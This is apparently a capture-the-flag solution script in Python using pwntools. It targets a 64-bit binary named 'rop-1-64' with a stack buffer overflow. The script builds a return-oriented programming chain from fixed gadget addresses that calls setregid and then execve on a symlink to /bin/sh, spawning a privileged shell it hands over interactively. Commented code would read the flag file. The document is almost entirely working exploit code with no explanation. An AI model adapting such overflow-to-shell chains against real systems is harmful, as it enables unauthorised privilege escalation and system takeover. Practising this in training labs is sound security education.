from pwn import *
import os

DEBUG = False
file = "./rop-1-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
max_len = 136

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x000000000040071d
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

os.symlink("/bin/sh", "./main")

setregid = p64(elf.symbols["setregid"])
execve = p64(elf.symbols["execve"])

main = p64(0x4003cf)
pop_rdi = p64(0x00000000004007b3)
pop_rsi_2 = p64(0x00000000004007b1)
pop_rdx_2 = p64(0x0000000000400699)

payload = flat (
    b"A" * max_len,
    pop_rdi,    
    p64(50001),
    pop_rsi_2,
    p64(50001),
    p64(50001),
    setregid,
    pop_rdi,
    main,
    pop_rsi_2,
    p64(0),
    p64(0),
    pop_rdx_2,
    p64(0),
    p64(0),
    execve
)

io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
os.unlink("./main")
